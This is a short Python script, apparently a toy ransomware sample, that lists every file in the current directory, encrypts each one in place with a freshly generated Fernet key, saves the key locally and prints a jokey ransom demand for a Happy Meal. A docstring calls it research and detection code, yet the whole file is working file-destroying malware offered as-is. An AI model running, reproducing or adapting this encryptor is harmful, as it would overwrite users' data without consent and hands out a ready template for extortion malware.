#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

class FileEncryptor:
    """
    DISCLAIMER: This code is provided for research and detection purposes only.
    It is intended to be used responsibly and legally to protect computer systems,
    data, and networks from potential threats. Any misuse of this code for malicious
    purposes is strictly prohibited and may be subject to legal consequences.
    """

    def __init__(self):
        self.key = None

    def find_eligible_files(self):
        eligible_files = []
        for file in os.listdir():
            if file not in ["foodie.py", "thekey.key", "decrypt.py"] and os.path.isfile(file):
                eligible_files.append(file)
        return eligible_files

    def generate_key(self):
        self.key = Fernet.generate_key()

    def save_key_to_file(self, filename="thekey.key"):
        if self.key:
            with open(filename, "wb") as key_file:
                key_file.write(self.key)
        else:
            print("No key to save. Please generate a key first.")

    def encrypt_files(self, files):
        if self.key:
            for file in files:
                with open(file, "rb") as input_file:
                    contents = input_file.read()
                contents_encrypted = Fernet(self.key).encrypt(contents)
                with open(file, "wb") as output_file:
                    output_file.write(contents_encrypted)
        else:
            print("No key available. Please generate a key first.")

    def run(self):
        eligible_files = self.find_eligible_files()

        if not eligible_files:
            print("No eligible files found.")
            return

        print("Eligible files:", eligible_files)

        self.generate_key()
        self.save_key_to_file()
        self.encrypt_files(eligible_files)

        print("All of your files have been encrypted!! Send me a Happy Meal with Chocolate Milk!!")

if __name__ == "__main__":
    encryptor = FileEncryptor()
    encryptor.run()
